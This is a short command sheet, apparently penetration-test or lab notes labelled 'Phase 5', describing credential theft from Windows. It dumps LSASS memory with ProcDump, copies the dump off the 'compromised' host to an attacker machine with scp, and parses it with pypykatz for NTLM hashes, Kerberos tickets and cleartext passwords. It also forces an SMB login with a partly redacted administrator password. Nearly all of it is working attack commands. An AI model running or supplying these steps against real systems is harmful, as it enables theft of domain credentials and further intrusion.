# 💻 Phase 5 Commands — LSASS Memory Dumping & Credential Extraction

## Execute LSASS Memory Dump with ProcDump

```powershell
C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass_new.dmp
```

### Purpose

Creates a full memory dump of the LSASS process for offline credential extraction and authentication session analysis.

---

## Transfer Dump File to Attacker System

```bash
scp administrator@192.168.10.100:/mnt/c/Users/Public/lsass_new.dmp .
```

### Purpose

Transfers the LSASS dump file from the compromised Windows system to the attacker-controlled machine for offline analysis.

---

## Parse LSASS Dump with pypykatz

```bash
pypykatz lsa minidump ./dumps/lsass_new.dmp
```

### Purpose

Parses the LSASS memory dump to extract authentication sessions, NTLM hashes, Kerberos material, and potential cleartext credentials.

---

## Trigger SMB Authentication Session

```powershell
net use \\127.0.0.1\c$ /user:SOLARIS\Administrator "(3vRPS<REDACTED>"
```

### Purpose

Forces a privileged SMB authentication event to generate a new authentication session within LSASS memory.

---

## Verify Authentication Session

```powershell
klist
```

### Purpose

Displays active Kerberos tickets and authentication sessions present on the system.
